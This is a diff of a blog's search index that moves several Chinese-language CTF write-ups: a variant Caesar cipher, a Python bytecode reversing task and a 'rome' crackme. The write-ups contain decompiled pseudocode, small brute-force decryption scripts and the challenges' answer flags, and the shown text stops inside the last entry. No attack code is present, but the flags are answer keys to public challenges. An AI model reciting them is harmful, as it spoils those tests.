@@ -1,6 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>[BUUCTF]变异凯撒</title>
+    <url>/2021/11/02/%5BCrypto%5D%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92/</url>
+    <content><![CDATA[<p>题目: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">猜测明文：flag&#123;...&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看标题, <strong>变异凯撒</strong>,
+想必这题就是基于凯撒密码延伸出来的, 有了上次的经验,
+我们再把这个字符的<code>ASCII</code>码拿来对比一下,
+密文不外乎又是一些移位变换出来的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_ascii</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> args:</span><br><span class="line">        ascii_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">            ascii_list.append(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line"></span><br><span class="line">show_ascii(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[97, 102, 90, 95, 114, 57, 86, 89, 102, 83, 99, 79...]</span></span><br><span class="line"><span class="comment">#[102, 108, 97, 103]</span></span><br></pre></td></tr></table></figure>
+<p>可以看到, 密文的前4位的<code>ASCII</code>码比 "flag"
+这4个字符从第1位起依次大了5, 6, 7, 8, 后面的以此类推.
+写出解密脚本即可拿到<strong>flag</strong>.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ciphertext = <span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i])+(<span class="number">5</span>+i))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;Caesar_variation&#125;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+        <tag>古典密码</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[BUUCTF]rsa</title>
     <url>/2022/01/25/%5BCrypto%5Drsa/</url>
     <content><![CDATA[<p>给了两个文件, 一个加密后的文件, 一个<code>公钥</code>,
@@ -80,28 +102,6 @@ class="math inline">\(\phi(n)\)</span>的<code>模逆元</code>,
         <tag>密码学</tag>
         <tag>RSA</tag>
         <tag>非对称加密</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[BUUCTF]变异凯撒</title>
-    <url>/2021/11/02/%5BCrypto%5D%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92/</url>
-    <content><![CDATA[<p>题目: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">猜测明文：flag&#123;...&#125;</span><br></pre></td></tr></table></figure></p>
-<p>看标题, <strong>变异凯撒</strong>,
-想必这题就是基于凯撒密码延伸出来的, 有了上次的经验,
-我们再把这个字符的<code>ASCII</code>码拿来对比一下,
-密文不外乎又是一些移位变换出来的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_ascii</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> args:</span><br><span class="line">        ascii_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">            ascii_list.append(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line"></span><br><span class="line">show_ascii(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[97, 102, 90, 95, 114, 57, 86, 89, 102, 83, 99, 79...]</span></span><br><span class="line"><span class="comment">#[102, 108, 97, 103]</span></span><br></pre></td></tr></table></figure>
-<p>可以看到, 密文的前4位的<code>ASCII</code>码比 "flag"
-这4个字符从第1位起依次大了5, 6, 7, 8, 后面的以此类推.
-写出解密脚本即可拿到<strong>flag</strong>.</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ciphertext = <span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i])+(<span class="number">5</span>+i))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;Caesar_variation&#125;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Crypto</category>
-      </categories>
-      <tags>
-        <tag>密码学</tag>
-        <tag>古典密码</tag>
       </tags>
   </entry>
   <entry>
@@ -484,6 +484,49 @@ alt="image-20220123142250428" />
       </tags>
   </entry>
   <entry>
+    <title>[GWCTF 2019]pyre</title>
+    <url>/2022/01/23/%5BReverse%5DGWCTF-2019-pyre/</url>
+    <content><![CDATA[<p><code>Python</code>的逆向,
+采用<code>uncompyle6</code>进行"反编译"</p>
+<blockquote>
+<p>uncompyle6: <a
+href="https://github.com/rocky/python-uncompyle6">Github</a></p>
+</blockquote>
+<p>安装很简单,
+直接用<code>pip</code>安装就可以了(<code>pip</code>建议先换源)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br></pre></td></tr></table></figure>
+<p>使用也简单,
+比如要反编译<code>test.pyc</code>输出到<code>decompile.py</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o decompile.py test.pyc</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231803989.png"
+alt="image-20220123180336910" />
+<figcaption aria-hidden="true">image-20220123180336910</figcaption>
+</figure>
+<p>反编译出来的<code>Python</code>代码有些问题,
+还是<code>Python2</code>的, 不过出题人的意图很明显,
+最下面的<code>code</code>应该是<code>input1</code>经过两次变换后的结果,
+要用它逆推出<code>input1</code>.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231818958.png"
+alt="image-20220123181846852" />
+<figcaption aria-hidden="true">image-20220123181846852</figcaption>
+</figure>
+<p>可以对每一位穷举, 照着这个代码里的变换规则来就行, 解密代码如下</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> arr[] = &#123; <span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">char</span> result[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">sizeof</span>(arr) - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)	<span class="comment">//先进行一次异或,初步还原内容</span></span><br><span class="line">		arr[i] = arr[i] ^ arr[i + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(arr); i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)		<span class="comment">//穷举所有可打印ASCII字符</span></span><br><span class="line">			<span class="keyword">if</span> (((j + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span> == arr[i])</span><br><span class="line">				result[i] = j;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//GWHT&#123;Just_Re_1s_Ha66y!&#125;</span></span><br></pre></td></tr></table></figure>
+<p>所以<strong>flag</strong>就是<code>flag&#123;Just_Re_1s_Ha66y!&#125;</code></p>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>逆向</tag>
+        <tag>Python逆向</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[BUUCTF]CrackRTF</title>
     <url>/2022/01/26/%5BReverse%5DCrackRTF/</url>
     <content><![CDATA[<p>无壳, 拖进<code>IDA</code>, F5查看伪代码</p>
@@ -600,49 +643,6 @@ alt="image-20220126211735455" />
       </tags>
   </entry>
   <entry>
-    <title>[GWCTF 2019]pyre</title>
-    <url>/2022/01/23/%5BReverse%5DGWCTF-2019-pyre/</url>
-    <content><![CDATA[<p><code>Python</code>的逆向,
-采用<code>uncompyle6</code>进行"反编译"</p>
-<blockquote>
-<p>uncompyle6: <a
-href="https://github.com/rocky/python-uncompyle6">Github</a></p>
-</blockquote>
-<p>安装很简单,
-直接用<code>pip</code>安装就可以了(<code>pip</code>建议先换源)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br></pre></td></tr></table></figure>
-<p>使用也简单,
-比如要反编译<code>test.pyc</code>输出到<code>decompile.py</code>文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o decompile.py test.pyc</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231803989.png"
-alt="image-20220123180336910" />
-<figcaption aria-hidden="true">image-20220123180336910</figcaption>
-</figure>
-<p>反编译出来的<code>Python</code>代码有些问题,
-还是<code>Python2</code>的, 不过出题人的意图很明显,
-最下面的<code>code</code>应该是<code>input1</code>经过两次变换后的结果,
-要用它逆推出<code>input1</code>.</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231818958.png"
-alt="image-20220123181846852" />
-<figcaption aria-hidden="true">image-20220123181846852</figcaption>
-</figure>
-<p>可以对每一位穷举, 照着这个代码里的变换规则来就行, 解密代码如下</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> arr[] = &#123; <span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">char</span> result[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">sizeof</span>(arr) - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)	<span class="comment">//先进行一次异或,初步还原内容</span></span><br><span class="line">		arr[i] = arr[i] ^ arr[i + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(arr); i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)		<span class="comment">//穷举所有可打印ASCII字符</span></span><br><span class="line">			<span class="keyword">if</span> (((j + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span> == arr[i])</span><br><span class="line">				result[i] = j;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//GWHT&#123;Just_Re_1s_Ha66y!&#125;</span></span><br></pre></td></tr></table></figure>
-<p>所以<strong>flag</strong>就是<code>flag&#123;Just_Re_1s_Ha66y!&#125;</code></p>
-]]></content>
-      <categories>
-        <category>Reverse</category>
-      </categories>
-      <tags>
-        <tag>逆向</tag>
-        <tag>Python逆向</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[GXYCTF2019]luck_guy</title>
     <url>/2022/01/22/%5BReverse%5DGXYCTF2019-luck-guy/</url>
     <content><![CDATA[<p>不是PE文件, 进<code>IDA</code>分析, F5看伪代码.</p>
@@ -746,23 +746,6 @@ alt="image-20220121230115616" />
       </categories>
   </entry>
   <entry>
-    <title>[BUUCTF]rome</title>
-    <url>/2022/01/25/%5BReverse%5Drome/</url>
-    <content><![CDATA[<p>无壳, 拖进<code>IDA</code>, <code>F5</code>查看伪代码,
-主函数里面主要就<code>func()</code>函数, 跟到<code>func()</code>里</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解法很常规, 分析算法, 写出解密程序</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> ciphertext[<span class="number">32</span>] = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>;</span><br><span class="line">	<span class="type">char</span> plaintext[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">char</span> c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++)	<span class="comment">//逐位穷举所有ASCII可打印字符</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> temp = c;</span><br><span class="line">			<span class="keyword">if</span> (c &gt; <span class="number">64</span> &amp;&amp; c &lt;= <span class="number">90</span>)</span><br><span class="line">				temp = (c - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c &gt; <span class="number">96</span> &amp;&amp; c &lt;= <span class="number">122</span>)</span><br><span class="line">				temp = (c - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">			<span class="keyword">if</span> (temp == ciphertext[i])</span><br><span class="line">				plaintext[i] = c;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ACTF&#123;%s&#125;&quot;</span>, plaintext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ACTF&#123;Cae3ar_th4_Gre@t&#125;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Reverse</category>
-      </categories>
-      <tags>
-        <tag>二进制</tag>
-        <tag>逆向</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[BUUCTF]findit</title>
     <url>/2022/01/23/%5BReverse%5Dfindit/</url>
     <content><![CDATA[<p>是个<code>apk</code>, 拿<code>AndroidKiller</code>反编译,
@@ -815,6 +798,44 @@ alt="image-20220123163357380" />
         <tag>逆向</tag>
         <tag>Java逆向</tag>
         <tag>Android逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[BUUCTF]rome</title>
+    <url>/2022/01/25/%5BReverse%5Drome/</url>
+    <content><![CDATA[<p>无壳, 拖进<code>IDA</code>, <code>F5</code>查看伪代码,
+主函数里面主要就<code>func()</code>函数, 跟到<code>func()</code>里</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
